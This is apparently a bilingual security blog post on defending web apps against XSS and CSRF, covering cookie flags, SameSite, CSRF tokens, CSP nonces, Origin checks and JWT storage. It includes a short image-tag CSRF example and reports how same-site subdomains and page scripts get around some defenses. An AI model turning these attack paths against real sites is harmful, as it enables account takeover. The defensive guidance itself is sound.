+<p><strong>1. Lock the cookie down, and ship the free header while you are here.</strong> <code>HttpOnly</code> stops JS reading it, <code>Secure</code> keeps it off plaintext HTTP. <code>nosniff</code> is one line and belongs in this batch, even though it defends the script-execution layer covered in step 4.</p>
+<pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; Path=/
+X-Content-Type-Options: nosniff
+</code></pre>
+<p>XSS can no longer exfiltrate it. It can still <em>use</em> the session from inside the page, so this is a downgrade, not a cure.</p>
+<p><strong>2. Stop classic CSRF with <code>SameSite</code>.</strong> Cross-site sub-resource requests (the <code>&#x3C;img src="bank.com/transfer"></code> trick) and cross-site form POSTs stop carrying the cookie. Chrome already treats a bare cookie as <code>Lax</code>, but writing it out also closes Chrome's two-minute POST exception, and makes Firefox and Safari behave the same way.</p>
+<pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
+</code></pre>
+<p>Use <code>SameSite=Strict</code> for admin and money endpoints.</p>
+<p><strong>3. Add a CSRF token</strong> on state-changing requests, since <code>SameSite</code> leaves gaps. "Site" means scheme plus registrable domain, so <code>https://evil.bank.com</code> is the same site as <code>https://bank.com</code>; a subdomain someone else controls (a forgotten one taken over, a user-content host) passes every <code>SameSite</code> check. In testing, an <code>&#x3C;img></code> and a form POST on <code>evil.bank.test</code> both carried the <code>bank.test</code> cookie marked <code>Strict</code>, in Chrome and in Firefox. The <code>Origin</code> header still said <code>https://evil.bank.test</code>, which is why step 5 helps here. <code>Lax</code> also still sends the cookie when another site links to one of your GET URLs, so a GET that changes state is exposed.</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="html" data-theme="github-dark github-light"><code data-language="html" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">form</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> action</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"/transfer"</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> method</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"POST"</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">  &#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">input</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> type</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"hidden"</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> name</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"csrf_token"</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> value</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">=</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">"{{ csrfToken }}"</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;/</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">form</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">></span></span></code></pre></figure>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// server, on POST. Check both exist: undefined !== undefined is false, so a session</span></span>
+<span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// with no token and a request with no token would otherwise pass.</span></span>
+<span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">if</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> (</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">!</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">session.csrfToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">||</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> req.body.csrf_token </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">!==</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> session.csrfToken) </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">return</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> res.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">status</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5">403</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">end</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">()</span></span></code></pre></figure>
+<p><strong>4. The foundation, written out.</strong> CSP nonce and framework auto-escape (<code>nosniff</code> already shipped in step 1). This is the foundation from the top of this list. If you started a fresh project here, the box is already ticked and everything above was the cheap hygiene you layered on after.</p>
+<pre><code>Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
+</code></pre>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="jsx" data-theme="github-dark github-light"><code data-language="jsx" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">&#x3C;</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">div</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">>{userInput}&#x3C;/</span><span style="--shiki-dark:#85E89D;--shiki-light:#22863A">div</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">>   </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// safe, the framework escapes it</span></span>
+<span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// never feed user data to dangerouslySetInnerHTML / v-html / innerHTML</span></span></code></pre></figure>
+<p><strong>5. Reject foreign <code>Origin</code></strong> on state-changing routes. Cheap second layer. Browsers sent <code>Origin</code> on every POST in testing, same-origin form and <code>fetch</code> included, and left it off plain GETs, so check it on the methods that change state. A missing <code>Origin</code> on a POST is no proof it came from you; this check rejects it too.</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">if</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> (req.method </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">===</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62"> 'POST'</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> &#x26;&#x26;</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> req.headers.origin </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">!==</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62"> 'https://bank.com'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">) </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">return</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> res.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">status</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5">403</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">).</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">end</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">()</span></span></code></pre></figure>
+<p><strong>6. Re-auth on the dangerous stuff.</strong> Transfer money, change email, delete account: re-enter password or tap a security key. If XSS gets in, this is the one layer that still makes it ask you first.</p>
+</details>
+<details>
+<summary>Harden a JWT app, foundation first</summary>
+<p>Do the foundation before you touch the token. Everything about where the token lives (A, B, C below) only limits the damage once XSS is already in. One layer keeps XSS out in the first place, so it comes first.</p>
+<p><strong>D. The foundation: stop XSS from running at all.</strong> CSP nonce, framework auto-escape, nosniff, and re-auth on sensitive ops. A token sitting in <code>localStorage</code> behind solid CSP can be safer than a perfectly placed token with no CSP, because the second app still lets injected script run. This is the one layer that keeps the attacker out instead of just limiting the damage.</p>
+<pre><code>Content-Security-Policy: script-src 'self' 'nonce-RANDOM'
+X-Content-Type-Options: nosniff
+</code></pre>
+<p>Then choose where the token lives. These are lettered, not numbered like the cookie ladder above, because you pick one, not all: A, B, and C answer the single question of where the token sits, and each replaces the one before. Pick the furthest you can reach.</p>
+<p><strong>A. Token in <code>localStorage</code>.</strong> The worst. One XSS line steals it, and it replays from any device until expiry.</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">localStorage.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">setItem</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'token'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">, jwt)   </span><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// don't</span></span></code></pre></figure>
+<p><strong>B. Token in memory.</strong> A module variable or store, never persisted. It disappears when the tab closes, so an XSS that runs later finds nothing. XSS that runs while the tab is open can still read it and send it away, and that copy works until the token expires. Replaces A.</p>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">let</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> accessToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">=</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5"> null</span></span>
+<span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">function</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> setToken</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#FFAB70;--shiki-light:#E36209">t</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">) { accessToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">=</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> t }</span></span></code></pre></figure>
+<p><strong>C. Short-lived access token in memory, refresh token in an <code>HttpOnly</code> cookie.</strong> The access token lives 5-15 min in a memory variable; the refresh token goes somewhere JS can never read. Replaces B.</p>
+<pre><code>Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh
+</code></pre>
+<figure data-rehype-pretty-code-figure=""><pre tabindex="0" data-language="js" data-theme="github-dark github-light"><code data-language="js" data-theme="github-dark github-light" style="display: grid;"><span data-line=""><span style="--shiki-dark:#6A737D;--shiki-light:#6A737D">// silent refresh, the browser sends the refresh cookie on its own</span></span>
+<span data-line=""><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">const</span><span style="--shiki-dark:#79B8FF;--shiki-light:#005CC5"> res</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> =</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49"> await</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1"> fetch</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">(</span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'/auth/refresh'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">, { credentials: </span><span style="--shiki-dark:#9ECBFF;--shiki-light:#032F62">'include'</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> })</span></span>
+<span data-line=""><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">accessToken </span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">=</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> (</span><span style="--shiki-dark:#F97583;--shiki-light:#D73A49">await</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E"> res.</span><span style="--shiki-dark:#B392F0;--shiki-light:#6F42C1">json</span><span style="--shiki-dark:#E1E4E8;--shiki-light:#24292E">()).accessToken</span></span></code></pre></figure>
+<p>An XSS payload can't read the refresh token, but it can run these same two lines. In testing, a script on the page called <code>/auth/refresh</code> three times and read three new access tokens, in both browsers. It is the <code>HttpOnly</code> caveat again: the cookie can't be read, but it can still be used. So while the tab stays open, the payload can get a fresh token every few minutes and send each one out. The short lifetime limits what happens after the tab closes: the last token sent out stops working within minutes, and the refresh token never left the browser.</p>
+<p>The refresh cookie auto-attaches, so <code>/auth/refresh</code> has a CSRF surface of its own. <code>SameSite=Strict</code> on that one cookie closes it to other sites; a sibling subdomain is same site and still gets it, so check <code>Origin</code> on this endpoint too. Strict doesn't break the normal flow: in testing, a user who arrived from another site's link and whose page then called <code>/auth/refresh</code> sent the <code>Strict</code> cookie, because that call starts from your own page. You've shrunk CSRF from the whole app to a single endpoint.</p>
+<p>The strongest JWT app is D plus C: keep XSS out. If it ever gets in, it can still get fresh tokens through <code>/auth/refresh</code> for as long as the victim's tab is open; C only makes sure that what it sent out stops working minutes after the tab closes. No CSRF token is needed while auth stays in the header, since the JWT doesn't auto-attach. Any route still on cookie auth is a cookie app, defend it as one.</p>
+</details>
+<hr>
+<h2>References</h2>
+<ul>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP CSRF Prevention Cheat Sheet</a></li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (MDN)</a></li>
+<li><a href="https://web.dev/articles/samesite-cookies-explained">SameSite cookies explained (web.dev)</a></li>
+<li><a href="https://web.dev/articles/trusted-types">Trusted Types (web.dev)</a></li>
+<li><a href="https://w3c.github.io/webappsec-csp/">Content Security Policy Level 3 (W3C)</a></li>
+<li><a href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#nonce-attributes">HTML Standard: nonce attributes</a></li>
+<li><a href="https://www.chromium.org/updates/same-site/">SameSite updates (Chromium)</a></li>
+</ul>8:["$","div",null,{"id":"root","children":["$","div",null,{"id":"main","className":"reading","children":["$","$L13",null,{"htmlContent":"$14","rawContent":"$15","base64Content":"$16","title":"XSS 跟 CSRF 各要怎麼防，為什麼先處理 XSS","createdAt":"$undefined","updatedAt":"$undefined","tags":["security","xss","csrf","web","cookie"],"altHtmlContent":"$17","altTitle":"XSS and CSRF: which defense stops which attack","currentLang":"zh","altLang":"en","canonicalPath":"/v2/xss-and-csrf-defense-stack"}]}]}]
